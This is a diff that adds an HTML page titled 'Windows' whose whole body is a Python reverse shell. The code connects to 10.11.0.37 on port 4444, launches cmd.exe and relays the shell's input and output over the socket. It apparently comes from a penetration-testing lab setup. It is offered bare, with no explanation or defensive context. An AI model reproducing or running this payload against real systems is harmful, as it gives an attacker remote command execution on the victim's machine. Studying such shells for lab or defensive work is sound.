@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Windows</title>
+</head><body>import os,socket,subprocess,threading;<br/>
+def s2p(s, p):<br/>
+&nbsp; &nbsp; while True:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; data = s.recv(1024)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if len(data) &gt; 0:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p.stdin.write(data)<br/>
+<br/>
+def p2s(s, p):<br/>
+&nbsp; &nbsp; while True:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.send(p.stdout.read(1))<br/>
+<br/>
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>
+s.connect(("10.11.0.37",4444))<br/>
+<br/>
+p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)<br/>
+<br/>
+s2p_thread = threading.Thread(target=s2p, args=[s, p])<br/>
+s2p_thread.daemon = True<br/>
+s2p_thread.start()<br/>
+<br/>
+p2s_thread = threading.Thread(target=p2s, args=[s, p])<br/>
+p2s_thread.daemon = True<br/>
+p2s_thread.start()<br/>
+<br/>
+try:<br/>
+&nbsp; &nbsp; p.wait()<br/>
+except KeyboardInterrupt:<br/>
+&nbsp; &nbsp; s.close()</body></html>
